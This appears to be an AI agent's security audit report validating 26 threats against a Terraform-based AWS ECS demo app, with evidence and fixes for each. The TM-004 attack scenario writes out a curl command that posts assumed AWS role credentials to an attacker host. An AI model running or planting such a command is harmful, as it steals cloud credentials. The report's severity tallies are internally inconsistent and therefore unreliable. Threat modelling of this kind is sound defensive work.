# Security Architect -- Phase 6 Validated Findings

## Metadata
| Field | Value |
|-------|-------|
| Agent | security-architect |
| Date | 2026-02-18 |
| Target System | Amazon ECS Fullstack App (Terraform Demo) |
| Scope | Validation of 26 threats (21 from Phase 3/4, 5 from Phase 5) |
| Methodology | Evidence-based validation with confidence scoring |
| Scoring System | OWASP Risk Rating |

---

## Validation Methodology

For each finding from Phases 3-5, this phase validates:
1. Whether a concrete, step-by-step attack path exists
2. Whether existing mitigations (from Phase 1 Security Control Inventory) reduce the risk
3. Whether the context (demo application with public data) changes the severity
4. Confidence level assignment (HIGH/MEDIUM/LOW)
5. Framework ID verification against `references/frameworks.md`

---

## Framework ID Verification

The following framework IDs were checked against the reference tables:

| ID Used | Status | Notes |
|---------|--------|-------|
| T1190 | VERIFIED | Exploit Public-Facing Application |
| T1078 | VERIFIED | Valid Accounts |
| T1195 | VERIFIED | Supply Chain Compromise |
| T1552 | VERIFIED | Unsecured Credentials |
| T1530 | VERIFIED | Data from Cloud Storage |
| T1498 | VERIFIED | Network DoS |
| T1562 | VERIFIED | Impair Defenses |
| T1595 | VERIFIED | Active Scanning |
| T1068 | VERIFIED | Exploitation for Privilege Escalation |
| T1485 | VERIFIED | Data Destruction |
| T1048 | VERIFIED | Exfiltration Over Alternative Protocol |
| CWE-311 | VERIFIED | Missing Encryption of Sensitive Data |
| CWE-306 | VERIFIED | Missing Authentication for Critical Function |
| CWE-269 | VERIFIED | Improper Privilege Management |
| CWE-312 | VERIFIED | Cleartext Storage of Sensitive Information |
| CWE-732 | VERIFIED | Incorrect Permission Assignment |
| CWE-770 | VERIFIED | Allocation of Resources Without Limits |
| CWE-200 | VERIFIED | Exposure of Sensitive Information |
| CWE-209 | VERIFIED | Generation of Error Message Containing Sensitive Information |
| CWE-400 | VERIFIED | Uncontrolled Resource Consumption |
| CWE-862 | VERIFIED | Missing Authorization |
| CWE-390 | VERIFIED | Detection of Error Condition Without Action |

**IDs not in reference set (flagged in Phase 3 -- corrected below)**:
- T1557 (Adversary-in-the-Middle) -- Not in reference table. TM-001 remapped to CWE-311 + OWASP A02:2021. MITRE field noted as "manual verification recommended."
- CWE-942 (CORS misconfiguration) -- Not in reference table. TM-008 uses CWE-732 (Incorrect Permission Assignment) as nearest match.
- CWE-778 (logging gap) -- Not in reference table. TM-011 uses CWE-390 (Detection of Error Condition Without Action) as nearest match.
- CWE-1104 (outdated components) -- Not in reference table. TM-015 described as plain text: "Use of unmaintained/outdated third-party components."
- CWE-345 (integrity verification) -- Not in reference table. TM-006 described as plain text: "Missing verification of data/image authenticity."
- CWE-353 (lockfile integrity) -- Not in reference table. TM-025 described as plain text: "Missing integrity check on lockfile."

---

## Validated Findings

### CRITICAL TM-004: Repository-Sourced Buildspec with Broad IAM Permissions

| Field | Value |
|-------|-------|
| ID | TM-004 |
| Severity | CRITICAL |
| Confidence | HIGH |
| Affected Component(s) | CodeBuild, CodePipeline, DevOpsRole, GitHub |
| Scoring System | OWASP Risk Rating |
| Score | 25 (L5 x I5) |
| Cross-Framework | MITRE: T1195 | CWE-269 | OWASP A08:2021 |

**Description**: CodeBuild sources its buildspec from the repository. Any developer with push access can modify `buildspec.yml` to execute arbitrary commands with the DevOps IAM role's permissions (PassRole *, S3 *, ECS *, ECR, CodeDeploy). No branch protection, no approval gates, no buildspec hash verification.

**Evidence**: `Infrastructure/modules/CodeBuild/main.tf:92-94` -- `source { type = "CODEPIPELINE"; buildspec = var.buildspec_path }`. The buildspec path is `Infrastructure/Templates/buildspec.yml` in the repository. `Infrastructure/modules/IAM/main.tf:287-293` -- DevOps role has `iam:PassRole` on `resources = ["*"]`.

**Attack Scenario**:
1. Developer pushes modified buildspec with command: `aws sts get-caller-identity && aws s3 ls && curl -X POST https://attacker.com/exfil -d "$(aws sts assume-role ...)"`
2. No branch protection blocks the push
3. CodePipeline detects change, triggers CodeBuild
4. Commands execute in privileged Docker container with DevOps IAM role
5. Attacker receives AWS credentials with PassRole * capability

**Existing Mitigations**: Blue/Green deployment with auto-rollback -- but this only catches deployment failures, not buildspec-level abuse. CloudWatch build logs provide post-incident forensics but no preventive control.

**Recommendation**: (1) Store buildspec in a separate, restricted repository or inline in Terraform (CodeBuild `buildspec` inline block). (2) Implement GitHub branch protection with required reviews and status checks. (3) Add a manual approval action in CodePipeline between Build and Deploy stages. (4) Scope IAM PassRole to specific role ARNs instead of `*`.

---

### CRITICAL TM-003: Overly Broad IAM PassRole Permissions

| Field | Value |
|-------|-------|
| ID | TM-003 |
| Severity | CRITICAL |
| Confidence | HIGH |
| Affected Component(s) | DevOpsRole, ECSTaskRole, CodeBuild, ServerECS |
| Scoring System | OWASP Risk Rating |
| Score | 20 (L4 x I5) |
| Cross-Framework | MITRE: T1078 | CWE-269 | OWASP A01:2021 |

**Description**: Both the DevOps IAM role and the ECS Task role have `iam:PassRole` with resource `*`. This enables privilege escalation to any IAM role in the account from any process using either role.

**Evidence**: `Infrastructure/modules/IAM/main.tf:287-293` (DevOps role): `actions = ["iam:PassRole"]`, `resources = ["*"]`. Lines 317-323 (ECS task role): identical `iam:PassRole` on `*`.

**Attack Scenario**:
1. Achieve code execution in ServerECS (via dependency exploit) or CodeBuild (via buildspec modification)
2. Call `aws iam list-roles` to enumerate available roles
3. Use `iam:PassRole` to create a Lambda function or ECS task with an admin-level role
4. Execute commands with escalated permissions

**Existing Mitigations**: Fargate isolation prevents host escape. SGs limit network movement. But IAM API calls are not network-restricted.

**Recommendation**: Scope PassRole to the specific role ARNs that each role needs to pass. DevOps role needs to pass ECS execution role and task role only: `resources = [aws_iam_role.ecs_task_execution_role.arn, aws_iam_role.ecs_task_role.arn]`. ECS task role should not need PassRole at all -- remove it entirely.

---

### HIGH TM-023: No Branch Protection on Repository

| Field | Value |
|-------|-------|
| ID | TM-023 |
| Severity | HIGH |
| Confidence | MEDIUM |
| Affected Component(s) | GitHub, CodePipeline |
| Scoring System | OWASP Risk Rating |
| Score | 16 (L4 x I4) |
| Cross-Framework | MITRE: T1195 | CWE-862 | OWASP A08:2021 |

**Description**: No GitHub branch protection rules are enforced. Any developer can push directly to the main branch without review, enabling TM-004.

**Evidence**: No Terraform resource manages branch protection. Phase 1 assumption: no branch protection rules in place.

**Attack Scenario**:
1. Developer pushes directly to main (no PR required)
2. CodePipeline polls for changes, detects push
3. Full build and deploy pipeline executes without any human review

**Existing Mitigations**: None.

**Recommendation**: Enable GitHub branch protection on main: require pull request reviews (minimum 1 reviewer), require status checks (build must pass), prevent force pushes, and prevent deletion. Consider using GitHub CODEOWNERS for buildspec and Terraform files.

**Note**: Confidence is MEDIUM because branch protection is managed outside this Terraform codebase (GitHub settings), and we are assuming it is not configured based on the absence of any Terraform management or README mention.

---

### HIGH TM-013: CodeBuild Privileged Docker Mode

| Field | Value |
|-------|-------|
| ID | TM-013 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | CodeBuild |
| Scoring System | OWASP Risk Rating |
| Score | 16 (L4 x I4) |
| Cross-Framework | MITRE: T1068 | CWE-269 | OWASP A05:2021 |

**Description**: CodeBuild runs in `privileged_mode = true`, which is required for Docker-in-Docker builds but amplifies TM-004 by giving the build environment elevated OS-level capabilities.

**Evidence**: `Infrastructure/modules/CodeBuild/main.tf:23` -- `privileged_mode = true`.

**Attack Scenario**: Same as TM-004, with elevated OS capabilities enabling additional attack vectors (device access, raw socket operations, mount operations).

**Existing Mitigations**: CodeBuild managed environment provides some isolation compared to self-hosted runners. Build timeout is 10 minutes, limiting extended abuse.

**Recommendation**: Privileged mode is required for Docker builds. The primary mitigation is to secure the buildspec (TM-004) and restrict IAM permissions (TM-003). Consider migrating to a build approach that does not require privileged mode (e.g., Kaniko, buildah, or ECR-native image building with CodeBuild v2 which supports Docker builds without privileged mode).

---

### HIGH TM-014: No Pipeline Approval Gates or Security Scanning

| Field | Value |
|-------|-------|
| ID | TM-014 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | CodePipeline, CodeBuild, CodeDeploy |
| Scoring System | OWASP Risk Rating |
| Score | 16 (L4 x I4) |
| Cross-Framework | MITRE: T1195 | CWE-862 | OWASP A08:2021 |

**Description**: No manual approval, SAST, DAST, SCA, or container scanning steps in the pipeline. Commits flow from source to production without security checks.

**Evidence**: `Infrastructure/modules/CodePipeline/main.tf` -- three stages (Source, Build, Deploy) with no approval action and no testing/scanning stage.

**Attack Scenario**: Vulnerable or malicious code reaches production without detection. Dependencies with known CVEs are deployed without scanning.

**Existing Mitigations**: Blue/Green deployment with auto-rollback on DEPLOYMENT_FAILURE (catches broken deployments but not security issues). Build timeout of 10 minutes.

**Recommendation**: (1) Add a manual approval action in CodePipeline between Build and Deploy stages. (2) Add a test/scan stage with SCA (`npm audit`), container scanning (ECR image scanning or Trivy), and SAST. (3) Enable ECR scan-on-push as a quick win.

---

### HIGH TM-001: No TLS/HTTPS on Public-Facing Load Balancers

| Field | Value |
|-------|-------|
| ID | TM-001 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | ClientALB, ServerALB |
| Scoring System | OWASP Risk Rating |
| Score | 15 (L5 x I3) |
| Cross-Framework | CWE-311 | OWASP A02:2021 | CIA: C-H, I-M |

**Description**: Both ALBs listen on HTTP only. HTTPS listener code exists but is disabled by default (`enable_https = false`). All user traffic is plaintext.

**Evidence**: `Infrastructure/modules/ALB/main.tf:20-21` -- HTTPS listener count is conditioned on `enable_https`, which defaults to false. Only HTTP listener (port 80) is active.

**Attack Scenario**: Network-position attacker intercepts HTTP traffic, reads API responses, modifies SPA bundle to inject malicious JavaScript.

**Existing Mitigations**: None for data in transit.

**Recommendation**: (1) Create an ACM certificate. (2) Set `enable_https = true` and configure the HTTPS listener with the certificate ARN. (3) Add HTTP-to-HTTPS redirect on the port 80 listener. (4) Add `Strict-Transport-Security` header via ALB response header policy.

---

### HIGH TM-002: Complete Absence of Authentication and Authorization

| Field | Value |
|-------|-------|
| ID | TM-002 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | ServerALB, ServerECS, ClientALB, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 15 (L5 x I3) |
| Cross-Framework | MITRE: T1190 | CWE-306 | OWASP A07:2021, API2:2023 |

**Description**: No authentication or authorization at any layer. All endpoints are publicly accessible.

**Evidence**: `Code/server/src/app.js` -- no middleware for authentication. Login.vue is client-side only (no server validation). No JWT, session, API key, or OAuth implementation.

**Attack Scenario**: Any internet user accesses all API endpoints. If sensitive endpoints are added, they are immediately exposed.

**Existing Mitigations**: None. The application is designed this way for demo purposes.

**Recommendation**: For production: implement authentication (AWS Cognito, Auth0, or custom JWT middleware). At minimum, add ALB authentication integration with Cognito or OIDC provider. For the demo: document prominently that this is not suitable for production without authentication.

**Context note**: Impact is capped at 3 because the current data is entirely public (product catalog). For any system with user data or write operations, this would be CRITICAL (L5 x I5 = 25).

---

### HIGH TM-005: GitHub OAuth Token Exposure in Terraform State

| Field | Value |
|-------|-------|
| ID | TM-005 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | TFState, GitHubToken, CodePipeline |
| Scoring System | OWASP Risk Rating |
| Score | 15 (L3 x I5) |
| Cross-Framework | MITRE: T1552 | CWE-312 | OWASP A02:2021 |

**Description**: GitHub OAuth token stored in plaintext in local Terraform state. Chains to TM-004 for full AWS compromise.

**Evidence**: `Infrastructure/modules/CodePipeline/main.tf:29` -- `OAuthToken = var.github_token`. State is local (no backend block in root module).

**Attack Scenario**: Deployer workstation compromised --> state file read --> GitHub token extracted --> repository access --> buildspec modification --> AWS compromise (TM-004 chain).

**Existing Mitigations**: `sensitive = true` on the Terraform variable (prevents display in plan output only). `lifecycle { ignore_changes = [stage[0].action[0].configuration] }` prevents token from appearing in diffs.

**Recommendation**: (1) Migrate to CodeStar Connections (GitHub v2) which does not require long-lived OAuth tokens. (2) If v1 must be used, store token in AWS Secrets Manager and reference via dynamic data source. (3) Migrate to a remote Terraform backend (S3 + DynamoDB) with encryption enabled. (4) Enable state file encryption at rest.

---

### HIGH TM-006: Mutable ECR Image Tags with Latest Tag Pattern

| Field | Value |
|-------|-------|
| ID | TM-006 |
| Severity | HIGH |
| Confidence | MEDIUM |
| Affected Component(s) | ECR, CodeBuild, ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 15 (L3 x I5) |
| Cross-Framework | MITRE: T1195 | OWASP A08:2021 | CIA: I-H |

**Description**: ECR tags are mutable and builds use `latest` tag. Image provenance cannot be verified.

**Evidence**: `Infrastructure/modules/ECR/main.tf:10` -- `image_tag_mutability = "MUTABLE"`. `Infrastructure/modules/CodeBuild/main.tf:42` -- `IMAGE_TAG = "latest"`.

**Attack Scenario**: Attacker with ECR push access overwrites `latest` tag with malicious image --> next deployment pulls malicious image.

**Existing Mitigations**: ECR push requires IAM credentials (DevOps role). Blue/Green deployment provides rollback capability.

**Recommendation**: (1) Set `image_tag_mutability = "IMMUTABLE"` on ECR repositories. (2) Use git commit SHA as image tag instead of `latest`. (3) Enable ECR image scanning on push. (4) Consider implementing image signing with AWS Signer or Notation.

**Confidence note**: MEDIUM because exploitation requires ECR push access, which requires either the DevOps role (via TM-004 chain) or compromised AWS credentials.

---

### HIGH TM-007: No WAF or Rate Limiting on Public Endpoints

| Field | Value |
|-------|-------|
| ID | TM-007 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | ClientALB, ServerALB |
| Scoring System | OWASP Risk Rating |
| Score | 12 (L4 x I3) |
| Cross-Framework | MITRE: T1498 | CWE-770 | OWASP API4:2023 |

**Description**: No WAF, rate limiting, or bot protection on either ALB. Autoscaling max is 4 tasks.

**Evidence**: No `aws_wafv2_web_acl` or `aws_wafv2_web_acl_association` resources in any Terraform module. SG ingress allows 0.0.0.0/0:80.

**Attack Scenario**: Volumetric L7 attack against /api/getAllProducts --> DynamoDB scan costs escalate --> ECS autoscaling maxes at 4 --> service degraded.

**Existing Mitigations**: AWS Shield Standard (automatic, free). ECS autoscaling (max 4 -- minimal). DynamoDB PAY_PER_REQUEST (auto-scales but generates cost).

**Recommendation**: (1) Associate AWS WAF with both ALBs. (2) Configure rate limiting rules (e.g., 1000 requests per 5 minutes per IP). (3) Add managed rule groups for common threats (AWS AWSManagedRulesCommonRuleSet). (4) Consider AWS Shield Advanced for advanced DDoS protection if moving to production.

---

### HIGH TM-022: Unrestricted Egress from ECS Tasks

| Field | Value |
|-------|-------|
| ID | TM-022 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | ServerECS, ClientECS, SG_ECS |
| Scoring System | OWASP Risk Rating |
| Score | 12 (L3 x I4) |
| Cross-Framework | MITRE: T1048 | CWE-269 | OWASP A05:2021 |

**Description**: Security group egress allows all protocols to all destinations (0.0.0.0/0). A compromised container can freely exfiltrate data or establish C2 channels.

**Evidence**: `Infrastructure/modules/SecurityGroup/main.tf:20-25` -- `egress { from_port = var.egress_port; to_port = var.egress_port; protocol = "-1"; cidr_blocks = var.cidr_blocks_egress }`. Default egress CIDR is 0.0.0.0/0.

**Attack Scenario**: Compromised container (via dependency exploit) --> extract ECS task role credentials from metadata endpoint --> exfiltrate to external server via unrestricted egress.

**Existing Mitigations**: Fargate isolation prevents host-level escape. NAT GW provides a chokepoint but does not filter traffic.

**Recommendation**: (1) Restrict egress to only required destinations: AWS service endpoints (DynamoDB, S3, ECR, CloudWatch), ALB internal IPs, and DNS. (2) Use VPC endpoints to eliminate the need for internet egress for AWS services. (3) Consider AWS Network Firewall for more granular egress filtering.

---

### HIGH TM-024: No Billing Alarm or Cost Anomaly Detection

| Field | Value |
|-------|-------|
| ID | TM-024 |
| Severity | HIGH |
| Confidence | HIGH |
| Affected Component(s) | DynamoDB, ServerECS, ClientECS, ServerALB |
| Scoring System | OWASP Risk Rating |
| Score | 12 (L4 x I3) |
| Cross-Framework | MITRE: T1498 | CWE-770 | OWASP API4:2023 |

**Description**: No billing alarm, AWS Budget, or Cost Anomaly Detection. DynamoDB PAY_PER_REQUEST + no rate limiting = unbounded cost exposure.

**Evidence**: No `aws_budgets_budget`, `aws_cloudwatch_metric_alarm` (for billing), or `aws_ce_anomaly_detection` resources in Terraform.

**Attack Scenario**: High-volume GET requests to /api/getAllProducts --> DynamoDB full table scan per request --> costs scale linearly --> no alarm triggers --> bill arrives at month end.

**Existing Mitigations**: None.

**Recommendation**: (1) Create a billing alarm in CloudWatch (e.g., alert when estimated charges exceed $50). (2) Create an AWS Budget with alert thresholds. (3) Enable AWS Cost Anomaly Detection. These are 1-line Terraform changes with outsized impact.

---

### MEDIUM TM-009: S3 Buckets Missing Security Controls

| Field | Value |
|-------|-------|
| ID | TM-009 |
| Severity | MEDIUM |
| Confidence | MEDIUM |
| Affected Component(s) | S3Assets, S3Pipeline |
| Scoring System | OWASP Risk Rating |
| Score | 9 (L3 x I3) |
| Cross-Framework | MITRE: T1530 | CWE-732 | OWASP A05:2021 |

**Description**: S3 buckets lack public_access_block, encryption, versioning, and have force_destroy=true.

**Evidence**: `Infrastructure/modules/S3/main.tf` -- minimal configuration with only `acl = "private"` and `force_destroy = true`.

**Attack Scenario**: Future Terraform change inadvertently adds permissive bucket policy --> no public_access_block safety net --> bucket exposed publicly.

**Existing Mitigations**: ACL "private" provides baseline restriction. S3 default encryption (AES-256) is enabled by AWS default since January 2023.

**Recommendation**: (1) Add `aws_s3_bucket_public_access_block` with all four settings enabled. (2) Add `aws_s3_bucket_versioning` for the pipeline artifacts bucket. (3) Explicitly configure `aws_s3_bucket_server_side_encryption_configuration` with KMS. (4) Remove `force_destroy = true` for production.

**Context note**: AWS now enables default encryption (SSE-S3) on all new buckets, which partially mitigates the encryption concern. The public_access_block absence remains the primary risk.

---

### MEDIUM TM-011: No VPC Flow Logs or Network Monitoring

| Field | Value |
|-------|-------|
| ID | TM-011 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | VPC (PubSubnets, PrivClientSubnets, PrivServerSubnets) |
| Scoring System | OWASP Risk Rating |
| Score | 9 (L3 x I3) |
| Cross-Framework | MITRE: T1562 | CWE-390 | OWASP A09:2021 |

**Description**: No VPC Flow Logs configured. Network-level visibility is zero.

**Evidence**: No `aws_flow_log` resource in any Terraform module.

**Existing Mitigations**: None for network-level monitoring. CloudWatch Logs captures application stdout only.

**Recommendation**: Enable VPC Flow Logs to CloudWatch Logs or S3. Configure for reject-only initially (lower volume/cost) and expand to all traffic for forensic capability.

---

### MEDIUM TM-015: Outdated and Vulnerable Dependencies

| Field | Value |
|-------|-------|
| ID | TM-015 |
| Severity | MEDIUM |
| Confidence | MEDIUM |
| Affected Component(s) | ServerECS, ClientECS, CodeBuild |
| Scoring System | OWASP Risk Rating |
| Score | 9 (L3 x I3) |
| Cross-Framework | MITRE: T1195 | OWASP A06:2021 | CIA: C-M, I-M, A-M |

**Description**: Multiple outdated dependencies with potential known CVEs (Express 4.16.4, aws-sdk v2, Axios 0.21.2, Vue 2.6.11).

**Evidence**: `Code/server/package.json`, `Code/client/package.json` -- version numbers confirmed via file review during Phase 1.

**Existing Mitigations**: Fargate isolation limits blast radius. SGs restrict lateral movement.

**Recommendation**: (1) Run `npm audit` on both server and client packages. (2) Update Express to 4.21+, migrate aws-sdk v2 to @aws-sdk/client-dynamodb (v3), update Axios, plan Vue 3 migration. (3) Set up Dependabot or Renovate for automated dependency updates. (4) Add `npm audit` as a build step in CodeBuild.

**Confidence note**: MEDIUM because exact CVE applicability depends on which code paths the application exercises, which requires running `npm audit` to confirm.

---

### MEDIUM TM-017: ECS Container Hardening Deficiencies

| Field | Value |
|-------|-------|
| ID | TM-017 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 9 (L3 x I3) |
| Cross-Framework | MITRE: T1068 | CWE-269 | OWASP A05:2021 |

**Description**: Containers run as root with writable filesystems. No readonlyRootFilesystem, no non-root user, no health checks.

**Evidence**: `Infrastructure/modules/ECS/TaskDefinition/main.tf` -- container definitions include only logConfiguration, image, name, networkMode, and portMappings. No `user`, `readonlyRootFilesystem`, or `healthCheck` fields.

**Existing Mitigations**: Fargate provides infrastructure isolation. awsvpc network mode enables per-task SG enforcement.

**Recommendation**: (1) Add `"readonlyRootFilesystem": true` to container definitions (mount writable tmpfs for `/tmp` if needed). (2) Add `"user": "1000:1000"` (ensure Dockerfiles create a non-root user). (3) Add `"healthCheck"` to container definitions. (4) Add resource limits (ulimits) for additional protection.

---

### MEDIUM TM-012: Error Handler Information Leakage and Code Bug

| Field | Value |
|-------|-------|
| ID | TM-012 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | ServerECS |
| Scoring System | OWASP Risk Rating |
| Score | 8 (L4 x I2) |
| Cross-Framework | MITRE: T1190 | CWE-209 | OWASP A05:2021 |

**Description**: Error handler leaks internal error details. JavaScript labeled statement bug on line 85 causes incorrect status handling.

**Evidence**: `Code/server/src/app.js:78-88` -- `res.send(error)` returns internal error code and message. Line 85 `status: err.status || 500` is a labeled statement (no-op), not assignment.

**Existing Mitigations**: None.

**Recommendation**: (1) Fix the error handler to sanitize error responses in production (return generic messages, log details internally). (2) Fix the labeled statement bug: change `status: err.status || 500` to `let status = err.status || 500` and use `res.status(status).send(...)`. (3) Differentiate error responses for development vs production environments.

---

### MEDIUM TM-025: npm install in Dockerfiles Bypasses Lockfile Integrity

| Field | Value |
|-------|-------|
| ID | TM-025 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | CodeBuild, ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 8 (L2 x I4) |
| Cross-Framework | MITRE: T1195 | OWASP A08:2021 |

**Description**: Dockerfiles use `npm install` which does not enforce lockfile integrity. Build reproducibility is not guaranteed.

**Evidence**: Verified during Phase 1 code scanning -- Dockerfiles use `npm install` rather than `npm ci`.

**Existing Mitigations**: package-lock.json exists in the repository (provides intent but is not enforced by `npm install`).

**Recommendation**: Replace `npm install` with `npm ci` in all Dockerfiles. This is a 1-word change with significant supply chain security improvement.

---

### MEDIUM TM-008: Unrestricted CORS Configuration

| Field | Value |
|-------|-------|
| ID | TM-008 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | ServerECS |
| Scoring System | OWASP Risk Rating |
| Score | 6 (L3 x I2) |
| Cross-Framework | MITRE: T1190 | CWE-732 | OWASP A05:2021, API8:2023 |

**Description**: `app.use(cors())` allows all origins. Currently low impact due to public data and no auth.

**Evidence**: `Code/server/src/app.js:10` -- `app.use(cors())` with no configuration object.

**Existing Mitigations**: No sensitive data or authentication means CORS abuse has minimal current impact.

**Recommendation**: Configure CORS with specific allowed origin: `app.use(cors({ origin: '{ClientALB_URL}' }))`. This is a 1-line change.

---

### MEDIUM TM-018: Single NAT Gateway Creates Single Point of Failure

| Field | Value |
|-------|-------|
| ID | TM-018 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | VPC, ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 6 (L2 x I3) |
| Cross-Framework | MITRE: T1498 | CWE-400 | OWASP A05:2021 |

**Description**: Single NAT GW in one AZ. AZ failure causes complete outage because no VPC endpoints exist.

**Evidence**: `Infrastructure/modules/Networking/main.tf:91-97` -- single `aws_nat_gateway` in `public_subnets[0]`.

**Existing Mitigations**: ECS tasks run across 2 AZs (but both depend on the same NAT GW for outbound).

**Recommendation**: (1) Add VPC endpoints for DynamoDB, S3, ECR, and CloudWatch (eliminates NAT dependency for AWS services). (2) For production: deploy NAT GW per AZ.

---

### MEDIUM TM-021: No Container Insights or Application Monitoring

| Field | Value |
|-------|-------|
| ID | TM-021 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | CloudWatch, ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 6 (L3 x I2) |
| Cross-Framework | MITRE: T1562 | CWE-390 | OWASP A09:2021 |

**Description**: No Container Insights, no application error alerting, no anomaly detection.

**Evidence**: No `containerInsights` setting in ECS Cluster module. No `aws_cloudwatch_metric_alarm` for application metrics.

**Existing Mitigations**: CloudWatch Logs captures container output. Autoscaling triggers based on CPU/memory.

**Recommendation**: (1) Enable Container Insights on the ECS cluster. (2) Create CloudWatch alarms for 5xx error rates, elevated latency, and unhealthy target count. (3) Consider X-Ray integration for distributed tracing.

---

### MEDIUM TM-026: No CloudTrail Data Events for DynamoDB/S3 API Auditing

| Field | Value |
|-------|-------|
| ID | TM-026 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | DynamoDB, S3Assets, S3Pipeline, CloudWatch |
| Scoring System | OWASP Risk Rating |
| Score | 6 (L3 x I2) |
| Cross-Framework | MITRE: T1562 | CWE-390 | OWASP A09:2021 |

**Description**: No CloudTrail data events for DynamoDB or S3. API-level access auditing is absent.

**Evidence**: No `aws_cloudtrail` resource in Terraform.

**Existing Mitigations**: CloudWatch Logs captures application stdout. AWS CloudTrail management events may be enabled at account level (outside this Terraform scope -- assumed not configured per Phase 1 assumptions).

**Recommendation**: Enable CloudTrail with data events for S3 and DynamoDB. Store trail in a separate, locked S3 bucket with versioning.

---

### MEDIUM TM-016: Swagger API Documentation Publicly Exposed

| Field | Value |
|-------|-------|
| ID | TM-016 |
| Severity | MEDIUM |
| Confidence | HIGH |
| Affected Component(s) | ServerECS, ServerALB |
| Scoring System | OWASP Risk Rating |
| Score | 5 (L5 x I1) |
| Cross-Framework | MITRE: T1595 | CWE-200 | OWASP API9:2023 |

**Description**: Swagger UI publicly accessible. Provides API documentation to attackers.

**Evidence**: `Code/server/src/app.js:13` -- `app.use('/api/docs', swagger.router)`.

**Existing Mitigations**: None. The current API is simple enough that Swagger does not reveal much beyond what enumeration would find.

**Recommendation**: Disable Swagger in production environments (conditional on NODE_ENV). Use a private documentation system for API reference.

---

### LOW TM-010: DynamoDB Missing Point-in-Time Recovery and CMK Encryption

| Field | Value |
|-------|-------|
| ID | TM-010 |
| Severity | LOW |
| Confidence | HIGH |
| Affected Component(s) | DynamoDB |
| Scoring System | OWASP Risk Rating |
| Score | 4 (L2 x I2) |
| Cross-Framework | MITRE: T1485 | CWE-311 | OWASP A05:2021 |

**Description**: No PITR, uses AWS-owned encryption key. Low impact for public product data.

**Evidence**: No `point_in_time_recovery` block in DynamoDB module. No `server_side_encryption` with KMS key.

**Existing Mitigations**: AWS-owned encryption at rest (default since 2018). Application has read-only DynamoDB access.

**Recommendation**: (1) Enable PITR: `point_in_time_recovery { enabled = true }`. (2) Consider CMK encryption if the data sensitivity increases. Both are 1-line Terraform changes.

---

### LOW TM-019: No VPC Endpoints for AWS Services

| Field | Value |
|-------|-------|
| ID | TM-019 |
| Severity | LOW |
| Confidence | HIGH |
| Affected Component(s) | ServerECS, ClientECS |
| Scoring System | OWASP Risk Rating |
| Score | 4 (L2 x I2) |
| Cross-Framework | CWE-311 | OWASP A05:2021 |

**Description**: No VPC endpoints; AWS API calls traverse NAT GW. Security impact is low because AWS SDK uses HTTPS.

**Evidence**: No `aws_vpc_endpoint` resources in Terraform.

**Existing Mitigations**: AWS SDK HTTPS encrypts data in transit. Fargate task role credentials are short-lived.

**Recommendation**: Add VPC endpoints for DynamoDB (gateway type, free), S3 (gateway type, free), ECR (interface type), and CloudWatch Logs (interface type). Gateway endpoints are free and improve both security and performance.

---

### LOW TM-020: SNS Topic with No Subscribers and No Encryption

| Field | Value |
|-------|-------|
| ID | TM-020 |
| Severity | LOW |
| Confidence | HIGH |
| Affected Component(s) | SNS |
| Scoring System | OWASP Risk Rating |
| Score | 3 (L3 x I1) |
| Cross-Framework | MITRE: T1562 | CWE-311 | OWASP A09:2021 |

**Description**: SNS deployment topic has no subscribers. Deployment events are lost.

**Evidence**: SNS module creates topic but no `aws_sns_topic_subscription` resource exists.

**Existing Mitigations**: None.

**Recommendation**: Add SNS subscription (email or Slack integration) for deployment notifications. Add SNS encryption with KMS.

---

## Deduplication Notes

| Merged/Related Findings | Rationale |
|------------------------|-----------|
| TM-004 + TM-023 | TM-023 (branch protection) is a precondition for TM-004 (buildspec modification). Kept separate because they have different remediations and can be fixed independently. |
| TM-004 + TM-013 | TM-013 (privileged Docker) amplifies TM-004. Kept separate because privileged mode may be required while buildspec sourcing can be changed. |
| TM-007 + TM-024 | TM-024 (billing alarm) is the cost consequence of TM-007 (no WAF). Kept separate because they have completely different remediations. |
| TM-011 + TM-021 + TM-026 | These three monitoring gaps are related but address different layers: network (flow logs), application (Container Insights), and API audit (CloudTrail). Kept separate for clarity. |
| TM-018 + TM-019 | VPC endpoints (TM-019) partially mitigate NAT GW SPOF (TM-018). Kept separate because TM-019 is a broader improvement. |

---

## Validation Completeness Check

### Phase 5 Finding Validation

All 5 Phase 5 findings have been validated:
- TM-022: VALIDATED -- HIGH confidence, realistic attack path
- TM-023: VALIDATED -- MEDIUM confidence (assumption about GitHub settings)
- TM-024: VALIDATED -- HIGH confidence, clear gap
- TM-025: VALIDATED -- HIGH confidence, confirmed in Dockerfiles
- TM-026: VALIDATED -- HIGH confidence, no CloudTrail resource

### Overall Validation Summary

| Category | Count |
|----------|-------|
| Total findings validated | 26 |
| Findings retained at original severity | 24 |
| Findings adjusted | 0 |
| Findings removed | 0 |
| Findings merged | 0 (related findings kept separate for clarity) |
| Framework IDs corrected | 6 (remapped to verified IDs or flagged as manual verification) |

---

## Validated Findings Summary

| Severity | Count | IDs |
|----------|-------|-----|
| CRITICAL | 2 | TM-003, TM-004 |
| HIGH | 9 | TM-001, TM-002, TM-005, TM-006, TM-007, TM-013, TM-014, TM-022, TM-023, TM-024 |
